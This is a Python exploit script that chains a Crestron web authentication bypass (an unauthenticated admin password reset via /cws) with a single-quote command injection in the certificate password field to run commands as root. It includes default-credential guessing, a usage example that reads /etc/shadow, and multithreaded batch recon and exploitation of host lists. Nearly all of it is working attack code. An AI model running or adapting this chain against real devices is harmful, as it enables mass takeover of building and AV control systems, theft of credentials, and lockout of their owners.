#!/usr/bin/env python3
"""
[REDACTED-ID]_004 → [REDACTED-ID]_001: Crestron Unauthenticated Remote Code Execution — Full Chain PoC

Chains two vulnerabilities for unauthenticated root-level command execution:

  [REDACTED-ID]_004: CWS Authentication Bypass
    /cws is excluded from lighttpd's mod_auth_ticket via authlocations_*.conf.
    The CWS handler (libRXModeHandler.so) performs NO internal authentication.
    resetPassword() sends CTP "RESETPASSWORD -P:<pw>" to a_console, which
    modifies /dev/shm/passwd — the SAME file lighttpd validates against.

  [REDACTED-ID]_001: Certificate Password OS Command Injection
    POST /Device/CertificateStore/WebServer/AddCertificate passes the
    "password" field through to a_console FUN_00027970, which calls:
      system("openssl pkcs12 -in %s -passin pass:'%s' -nodes ...")
    A single quote in the password breaks out of the shell context.

Kill Chain:
  1. GET  /cws/                              (verify unauthenticated access)
  2. POST /cws/systeminfo/resetpassword       (reset admin password via CTP)
  3. GET  /Device/DeviceInfo                   (authenticate with reset creds)
  4. POST /Device/CertificateStore/.../AddCertificate  (inject command via password)
  5. Arbitrary OS command executes as root (a_console privilege level)

Usage:
    # Single host — full chain (unauthenticated):
    python3 cf3_chain_unauthenticated_rce.py <host>
    python3 cf3_chain_unauthenticated_rce.py <host> -c "cat /etc/shadow"

    # Single host — standalone [REDACTED-ID]_001 (authenticated):
    python3 cf3_chain_unauthenticated_rce.py <host> --standalone -u admin -p admin -c "id"

    # Batch — chain mode recon (find hosts with open /cws):
    python3 cf3_chain_unauthenticated_rce.py -f targets.txt --recon -t 30 -o recon.txt

    # Batch — chain mode exploit:
    python3 cf3_chain_unauthenticated_rce.py -f targets.txt -c "id" -t 20 -o results.txt

    # Batch — standalone mode (try default creds + inject):
    python3 cf3_chain_unauthenticated_rce.py -f targets.txt --standalone -c "id" -t 20

Authors: [REDACTED] Team
Date:    2026-03-03
"""

import argparse
import base64
import json
import ssl
import sys
import threading
import time
import http.client
from concurrent.futures import ThreadPoolExecutor, as_completed


# ─── Configuration ──────────────────────────────────────────────────────────

CHAIN_PASSWORD_PREFIX = "crestron_"   # Prefix for the reset password
ADMIN_USERNAME = "admin"           # Default Crestron admin username
REQUEST_TIMEOUT = 15               # HTTP request timeout in seconds

DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "crestron"),
    ("crestron", "crestron"),
]


# ─── HTTP Transport ─────────────────────────────────────────────────────────

def make_request(host, port, method, path, body=None, headers=None,
                 auth=None, use_ssl=True):
    """Make HTTP/HTTPS request, returning (status_code, response_headers, body)."""
    if headers is None:
        headers = {}
    if auth:
        creds = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
        headers["Authorization"] = f"Basic {creds}"
    try:
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT,
                                                context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        resp_body = resp.read().decode("utf-8", errors="replace")
        resp_headers = dict(resp.getheaders())
        status = resp.status
        conn.close()
        return status, resp_headers, resp_body
    except Exception as e:
        return 0, {}, str(e)


# ─── Exploit Components ─────────────────────────────────────────────────────

def generate_chain_password():
    """Generate a deterministic but unique password for the chain attack."""
    return f"{CHAIN_PASSWORD_PREFIX}{int(time.time()) % 100000}"


def build_injection_payload(command):
    """Construct the single-quote breakout payload for [REDACTED-ID]_001.

    Input:   test';COMMAND;echo '
    Result:  ... -passin pass:'test';COMMAND;echo '' -nodes ...
    Shell:   openssl(fails) ; COMMAND(executes) ; echo(cleanup)
    """
    return f"test';{command};echo '"


def extract_command_output(response_body, command):
    """Extract the injected command's output from the response."""
    try:
        data = json.loads(response_body)
        constructed = data.get("Command_Constructed", "")
        marker = "echo '' -nodes 2>&1 | openssl x509 -checkend 0 -noout 2>&1"
        if marker in constructed:
            after_marker = constructed.split(marker, 1)[1]
            output = after_marker.split("Could not read certificate")[0].strip()
            if output:
                return output, data
        return constructed, data
    except json.JSONDecodeError:
        return response_body, None


def try_creds(host, port, use_ssl, cred_list):
    """Try credential pairs against /Device/DeviceInfo.
    Returns (username, password) on success, or None."""
    for user, pw in cred_list:
        status, _, body = make_request(host, port, "GET", "/Device/DeviceInfo",
                                       auth=(user, pw), use_ssl=use_ssl)
        if status == 200:
            return (user, pw)
    return None


# ─── Recon Functions ─────────────────────────────────────────────────────────

def recon_chain(host, port, use_ssl):
    """Probe a host for the full chain: /cws accessible + /Device behind auth.

    Returns dict with:
      status: 'chain_possible' | 'cws_auth' | 'cws_not_found' |
              'device_open' | 'error'
      detail: description
    """
    result = {"host": host}

    # 1. Check /cws accessibility
    status, _, body = make_request(host, port, "GET", "/cws/", use_ssl=use_ssl)
    if status == 0:
        result.update(status="error", detail=f"Connection failed: {body[:60]}")
        return result
    if status == 404:
        result.update(status="cws_not_found", detail="/cws endpoint not found (404)")
        return result
    if status in (301, 302, 303, 307, 308, 401, 403):
        result.update(status="cws_auth", detail=f"/cws requires auth (HTTP {status})")
        return result

    # /cws returned 200 — check if it looks like CWS
    cws_modules = []
    try:
        data = json.loads(body)
        cws_modules = data.get("Modules", [])
    except json.JSONDecodeError:
        pass

    # 2. Verify /Device requires auth
    status2, _, _ = make_request(host, port, "GET", "/Device/DeviceInfo", use_ssl=use_ssl)
    if status2 == 200:
        result.update(status="device_open",
                      detail=f"CWS open ({', '.join(cws_modules)}) BUT /Device also open — chain unnecessary")
        return result

    has_resetpw = "systeminfo" in [m.lower() for m in cws_modules]
    result.update(status="chain_possible",
                  detail=f"CWS OPEN + /Device auth required | modules: {', '.join(cws_modules)}"
                         f"{' | resetpassword available' if has_resetpw else ''}")
    return result


def recon_standalone(host, port, use_ssl, cred_list):
    """Probe a host for standalone [REDACTED-ID]_001: auth + CertificateStore.

    Returns dict with:
      status: 'vulnerable' | 'auth_ok_no_certstore' | 'creds_fail' |
              'no_web' | 'error'
      creds:  (user, pass) that worked, or None
      detail: description
    """
    result = {"host": host}

    status, _, body = make_request(host, port, "GET", "/", use_ssl=use_ssl)
    if status == 0:
        result.update(status="error", creds=None, detail=f"Connection failed: {body[:60]}")
        return result

    valid = try_creds(host, port, use_ssl, cred_list)
    if not valid:
        result.update(status="creds_fail", creds=None,
                      detail=f"None of {len(cred_list)} credential pairs worked")
        return result

    status, _, body = make_request(host, port, "GET", "/Device/CertificateStore",
                                   auth=valid, use_ssl=use_ssl)
    if status == 200:
        result.update(status="vulnerable", creds=valid,
                      detail=f"Auth as {valid[0]}, CertificateStore accessible")
    elif status == 404:
        result.update(status="auth_ok_no_certstore", creds=valid,
                      detail=f"Auth as {valid[0]}, CertificateStore not found")
    else:
        result.update(status="auth_ok_no_certstore", creds=valid,
                      detail=f"Auth as {valid[0]}, CertificateStore HTTP {status}")
    return result


# ─── Chain Exploit ───────────────────────────────────────────────────────────

def run_chain(host, port, use_ssl, command, verbose=True):
    """Execute the full [REDACTED-ID]_004 → [REDACTED-ID]_001 chain.
    Returns (success: bool, output: str)
    """
    proto = "https" if use_ssl else "http"

    if verbose:
        print(f"\n{'='*70}")
        print(f"  [REDACTED-ID]_004 → [REDACTED-ID]_001: UNAUTHENTICATED REMOTE CODE EXECUTION")
        print(f"  Target:  {proto}://{host}:{port}")
        print(f"  Command: {command}")
        print(f"{'='*70}\n")

    # Step 1: Verify CWS is unauthenticated
    if verbose:
        print(f"[STEP 1/5] Verifying /cws is accessible without authentication...")

    status, _, body = make_request(host, port, "GET", "/cws/", use_ssl=use_ssl)
    if status == 0:
        if verbose: print(f"    [FAIL] Connection failed: {body}")
        return False, ""
    if status in (401, 301, 302, 303, 307, 308, 403, 404):
        if verbose: print(f"    [FAIL] /cws not accessible (HTTP {status})")
        return False, ""
    if verbose:
        print(f"    [PASS] /cws accessible (HTTP {status})")

    # Step 2: Verify /Device requires auth
    if verbose:
        print(f"\n[STEP 2/5] Confirming /Device requires authentication...")

    status, _, body = make_request(host, port, "GET", "/Device/DeviceInfo", use_ssl=use_ssl)
    if status == 200:
        if verbose:
            print(f"    [INFO] /Device accessible without auth — exploiting directly")
        return exploit_cf3_001(host, port, use_ssl, None, None, command, verbose)
    if verbose:
        print(f"    [PASS] /Device requires authentication (HTTP {status})")

    # Step 3: Reset admin password
    chain_password = generate_chain_password()
    if verbose:
        print(f"\n[STEP 3/5] Resetting admin password via CWS...")
        print(f"           CTP: RESETPASSWORD -P:{chain_password}")

    reset_body = json.dumps({"password": f"-P:{chain_password}"})
    status, _, body = make_request(
        host, port, "POST", "/cws/systeminfo/resetpassword",
        body=reset_body, headers={"Content-Type": "application/json"},
        use_ssl=use_ssl)
    if status == 0:
        if verbose: print(f"    [FAIL] Connection failed: {body}")
        return False, ""
    if verbose:
        print(f"    [{'PASS' if status == 200 else 'WARN'}] Reset response: HTTP {status}")

    # Step 4: Auth with reset creds
    if verbose:
        print(f"\n[STEP 4/5] Authenticating with reset credentials...")

    status, _, body = make_request(
        host, port, "GET", "/Device/DeviceInfo",
        auth=(ADMIN_USERNAME, chain_password), use_ssl=use_ssl)
    if status == 401:
        if verbose: print(f"    [FAIL] Auth failed with reset password")
        return False, ""
    if verbose:
        print(f"    [PASS] Authenticated as '{ADMIN_USERNAME}'")

    # Step 5: Inject
    return exploit_cf3_001(host, port, use_ssl, ADMIN_USERNAME, chain_password,
                           command, verbose)


def exploit_cf3_001(host, port, use_ssl, username, password, command, verbose=True):
    """Exploit [REDACTED-ID]_001: Certificate password OS command injection."""
    injection = build_injection_payload(command)

    if verbose:
        print(f"\n[STEP 5/5] Injecting via certificate password...")
        print(f"           Payload: {injection}")

    payload = json.dumps({"certificate": "exploit.pfx", "password": injection})
    auth_tuple = (username, password) if username and password else None
    status, _, body = make_request(
        host, port, "POST",
        "/Device/CertificateStore/WebServer/AddCertificate",
        body=payload, headers={"Content-Type": "application/json"},
        auth=auth_tuple, use_ssl=use_ssl)

    if status == 0:
        if verbose: print(f"    [FAIL] Connection failed: {body}")
        return False, ""
    if status == 401:
        if verbose: print(f"    [FAIL] Auth rejected (HTTP 401)")
        return False, ""

    output, parsed = extract_command_output(body, command)

    if verbose:
        print(f"\n{'='*70}")
        print(f"  COMMAND OUTPUT:")
        print(f"{'='*70}")
        print(f"\n{output}\n")
        print(f"{'='*70}")

    return True, output


# ─── Batch Operations ────────────────────────────────────────────────────────

def load_hosts(filepath):
    """Load host list from text file (one IP/hostname per line)."""
    hosts = []
    with open(filepath, "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                hosts.append(line)
    return hosts


def parse_creds(creds_str):
    """Parse 'user:pass,user:pass' into list of tuples."""
    pairs = []
    for pair in creds_str.split(","):
        pair = pair.strip()
        if ":" in pair:
            u, p = pair.split(":", 1)
            pairs.append((u, p))
    return pairs if pairs else DEFAULT_CREDS


def run_batch_recon(hosts, port, use_ssl, standalone, cred_list, outfile, max_threads=20):
    """Multithreaded recon scan."""
    mode_label = "STANDALONE [REDACTED-ID]_001" if standalone else "CHAIN [REDACTED-ID]_004→[REDACTED-ID]_001"
    print(f"\n{'='*70}")
    print(f"  {mode_label} RECON — {len(hosts)} hosts — {max_threads} threads")
    if standalone:
        print(f"  Credentials: {', '.join(f'{u}:{p}' for u, p in cred_list)}")
    print(f"  Output: {outfile}")
    print(f"{'='*70}\n")

    lock = threading.Lock()
    progress = [0]
    total = len(hosts)
    results_list = [None] * total
    counts = {}

    def _worker(idx, host):
        if standalone:
            r = recon_standalone(host, port, use_ssl, cred_list)
        else:
            r = recon_chain(host, port, use_ssl)
        tag = r["status"].upper()
        with lock:
            progress[0] += 1
            counts[r["status"]] = counts.get(r["status"], 0) + 1
            print(f"  [{progress[0]:>4}/{total}] {host:<40s} [{tag:<20s}] {r['detail']}")
            sys.stdout.flush()
        results_list[idx] = r

    with ThreadPoolExecutor(max_workers=max_threads) as pool:
        futures = {pool.submit(_worker, i, h): i for i, h in enumerate(hosts)}
        for f in as_completed(futures):
            f.result()

    # Write in original order
    with open(outfile, "w") as f:
        f.write(f"# {mode_label} Recon — {total} hosts — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Threads: {max_threads}\n")
        f.write(f"# Format: IP | STATUS | DETAIL\n\n")
        for r in results_list:
            tag = r["status"].upper()
            f.write(f"{r['host']} | {tag} | {r['detail']}\n")

    print(f"\n{'='*70}")
    print(f"  RECON SUMMARY")
    print(f"{'='*70}")
    for status_key, count in sorted(counts.items(), key=lambda x: -x[1]):
        marker = "  ← TARGET" if status_key in ("chain_possible", "vulnerable", "device_open") else ""
        print(f"  {status_key.upper():<30s} {count:>4}{marker}")
    print(f"  {'TOTAL':<30s} {total:>4}")
    print(f"{'='*70}")
    print(f"  Results written to: {outfile}")

    exploitable = counts.get("chain_possible", 0) + counts.get("vulnerable", 0) + counts.get("device_open", 0)
    return exploitable


def run_batch_exploit(hosts, port, use_ssl, standalone, cred_list, command, outfile, max_threads=20):
    """Multithreaded exploit scan."""
    mode_label = "STANDALONE [REDACTED-ID]_001" if standalone else "CHAIN [REDACTED-ID]_004→[REDACTED-ID]_001"
    print(f"\n{'='*70}")
    print(f"  {mode_label} BATCH EXPLOIT — {len(hosts)} hosts — {max_threads} threads")
    if standalone:
        print(f"  Credentials: {', '.join(f'{u}:{p}' for u, p in cred_list)}")
    print(f"  Command: {command}")
    print(f"  Output:  {outfile}")
    print(f"{'='*70}\n")

    lock = threading.Lock()
    progress = [0]
    succeeded = [0]
    skipped = [0]
    total = len(hosts)
    results_list = [None] * total

    def _worker_chain(idx, host):
        # Quick recon
        r = recon_chain(host, port, use_ssl)
        if r["status"] not in ("chain_possible", "device_open"):
            with lock:
                progress[0] += 1
                skipped[0] += 1
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [SKIP] {r['status'].upper()}")
                sys.stdout.flush()
            results_list[idx] = {"host": host, "vuln": False, "tag": r["status"].upper(),
                                 "detail": r["detail"]}
            return

        ok, output = run_chain(host, port, use_ssl, command, verbose=False)
        output_oneline = output.replace("\n", " | ") if output else ""
        with lock:
            progress[0] += 1
            if ok:
                succeeded[0] += 1
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [VULN] → {output[:60]}")
            else:
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [FAIL] chain failed")
            sys.stdout.flush()
        results_list[idx] = {"host": host, "vuln": ok,
                             "tag": "VULNERABLE" if ok else "CHAIN_FAILED",
                             "output": output_oneline, "detail": output_oneline or "chain failed"}

    def _worker_standalone(idx, host):
        # Try creds
        r = recon_standalone(host, port, use_ssl, cred_list)
        if r["status"] != "vulnerable":
            with lock:
                progress[0] += 1
                skipped[0] += 1
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [SKIP] {r['status'].upper()}")
                sys.stdout.flush()
            results_list[idx] = {"host": host, "vuln": False, "tag": r["status"].upper(),
                                 "detail": r["detail"]}
            return

        user, pw = r["creds"]
        ok, output = exploit_cf3_001(host, port, use_ssl, user, pw, command, verbose=False)
        output_oneline = output.replace("\n", " | ") if output else ""
        with lock:
            progress[0] += 1
            if ok:
                succeeded[0] += 1
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [VULN] {user}:{pw} → {output[:60]}")
            else:
                print(f"  [{progress[0]:>4}/{total}] {host:<40s} [FAIL] {output[:60]}")
            sys.stdout.flush()
        results_list[idx] = {"host": host, "vuln": ok, "creds": f"{user}:{pw}",
                             "tag": "VULNERABLE" if ok else "EXPLOIT_FAILED",
                             "output": output_oneline, "detail": output_oneline or "exploit failed"}

    worker = _worker_standalone if standalone else _worker_chain

    with ThreadPoolExecutor(max_workers=max_threads) as pool:
        futures = {pool.submit(worker, i, h): i for i, h in enumerate(hosts)}
        for f in as_completed(futures):
            f.result()

    # Write in original order
    with open(outfile, "w") as f:
        f.write(f"# {mode_label} Exploit — {total} hosts — {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Command: {command}\n")
        f.write(f"# Threads: {max_threads}\n")
        f.write(f"# Format: IP | STATUS | OUTPUT\n\n")
        for r in results_list:
            h = r["host"]
            if r["vuln"]:
                creds_str = f" | creds={r['creds']}" if r.get("creds") else ""
                f.write(f"{h} | VULNERABLE{creds_str} | {r.get('output', '')}\n")
            else:
                f.write(f"{h} | {r['tag']} | {r['detail']}\n")

    print(f"\n{'='*70}")
    print(f"  BATCH RESULTS")
    print(f"{'='*70}")
    print(f"  VULNERABLE:  {succeeded[0]:>4}")
    print(f"  SKIPPED:     {skipped[0]:>4}")
    print(f"  TOTAL:       {total:>4}")
    print(f"{'='*70}")
    print(f"  Results written to: {outfile}")

    return succeeded[0]


# ─── Standalone Single-Host Mode ─────────────────────────────────────────────

def run_standalone(host, port, use_ssl, username, password, command, verbose=True):
    """Run [REDACTED-ID]_001 standalone (authenticated, no chain)."""
    proto = "https" if use_ssl else "http"

    if verbose:
        print(f"\n{'='*70}")
        print(f"  [REDACTED-ID]_001: AUTHENTICATED CERTIFICATE PASSWORD COMMAND INJECTION")
        print(f"  Target:  {proto}://{host}:{port}")
        print(f"  Creds:   {username}:{'*' * len(password)}")
        print(f"  Command: {command}")
        print(f"{'='*70}")
        print(f"\n[STEP 1/2] Verifying authentication...")

    status, _, body = make_request(host, port, "GET", "/Device/DeviceInfo",
                                   auth=(username, password), use_ssl=use_ssl)
    if status == 401:
        if verbose: print(f"    [FAIL] Authentication failed (HTTP 401)")
        return False, ""
    if verbose:
        print(f"    [PASS] Authenticated as '{username}'")
        print(f"\n[STEP 2/2] Exploiting [REDACTED-ID]_001...")

    return exploit_cf3_001(host, port, use_ssl, username, password, command, verbose)


# ─── Entry Point ─────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="[REDACTED-ID]_004 → [REDACTED-ID]_001: Crestron Unauthenticated RCE Chain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Single host — full chain (unauthenticated):
  %(prog)s [REDACTED-INTERNAL-IP] -c "id"

Single host — standalone [REDACTED-ID]_001 (authenticated):
  %(prog)s [REDACTED-INTERNAL-IP] --standalone -u admin -p admin -c "id"

Batch — chain recon (find hosts with open /cws):
  %(prog)s -f targets.txt --recon -t 30 -o recon.txt

Batch — chain exploit:
  %(prog)s -f targets.txt -c "id" -t 20 -o results.txt

Batch — standalone exploit (try default creds + inject):
  %(prog)s -f targets.txt --standalone -c "id" -t 20 -o results.txt

Batch — standalone recon with custom creds:
  %(prog)s -f targets.txt --standalone --recon --creds admin:admin,admin:crestron
        """)

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("host", nargs="?", default=None,
        help="Single target IP or hostname")
    group.add_argument("-f", "--file",
        help="File with target IPs/hostnames (one per line)")

    parser.add_argument("-c", "--command", default="id",
        help="OS command to execute (default: id)")
    parser.add_argument("--port", type=int, default=443,
        help="Target port (default: 443)")
    parser.add_argument("--no-ssl", action="store_true",
        help="Use HTTP instead of HTTPS")
    parser.add_argument("--standalone", action="store_true",
        help="Run [REDACTED-ID]_001 only (authenticated, no [REDACTED-ID]_004 chain)")
    parser.add_argument("-u", "--username", default="admin",
        help="Username for standalone single-host mode (default: admin)")
    parser.add_argument("-p", "--password", default="admin",
        help="Password for standalone single-host mode (default: admin)")
    parser.add_argument("--creds", default=None,
        help="Credential pairs for batch: user:pass,user:pass "
             "(default: admin:admin,admin:crestron,crestron:crestron)")
    parser.add_argument("-o", "--output", default=None,
        help="Output results file (default: cf3_chain_results.txt)")
    parser.add_argument("-t", "--threads", type=int, default=20,
        help="Number of concurrent threads for batch mode (default: 20)")
    parser.add_argument("--recon", action="store_true",
        help="Recon only — probe accessibility, no exploitation")
    parser.add_argument("-q", "--quiet", action="store_true",
        help="Minimal output (just the command result)")

    args = parser.parse_args()
    use_ssl = not args.no_ssl
    if args.no_ssl and args.port == 443:
        args.port = 80

    # ─── Batch mode ──────────────────────────────────────────────────────
    if args.file:
        try:
            hosts = load_hosts(args.file)
        except FileNotFoundError:
            print(f"[!] File not found: {args.file}", file=sys.stderr)
            sys.exit(1)
        if not hosts:
            print(f"[!] No hosts found in {args.file}", file=sys.stderr)
            sys.exit(1)

        cred_list = parse_creds(args.creds) if args.creds else DEFAULT_CREDS
        outfile = args.output or "cf3_chain_results.txt"

        if args.recon:
            exploitable = run_batch_recon(hosts, args.port, use_ssl, args.standalone,
                                          cred_list, outfile, max_threads=args.threads)
            sys.exit(0 if exploitable > 0 else 1)
        else:
            vuln_count = run_batch_exploit(hosts, args.port, use_ssl, args.standalone,
                                            cred_list, args.command, outfile,
                                            max_threads=args.threads)
            sys.exit(0 if vuln_count > 0 else 1)

    # ─── Single-host mode ────────────────────────────────────────────────
    verbose = not args.quiet

    if args.recon:
        if args.standalone:
            cred_list = parse_creds(args.creds) if args.creds else [(args.username, args.password)]
            r = recon_standalone(args.host, args.port, use_ssl, cred_list)
        else:
            r = recon_chain(args.host, args.port, use_ssl)
        print(f"{args.host}: [{r['status'].upper()}] {r['detail']}")
        sys.exit(0 if r["status"] in ("chain_possible", "vulnerable", "device_open") else 1)

    if args.standalone:
        success, output = run_standalone(
            args.host, args.port, use_ssl,
            args.username, args.password, args.command, verbose)
    else:
        success, output = run_chain(
            args.host, args.port, use_ssl, args.command, verbose)

    if args.quiet and output:
        print(output)

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
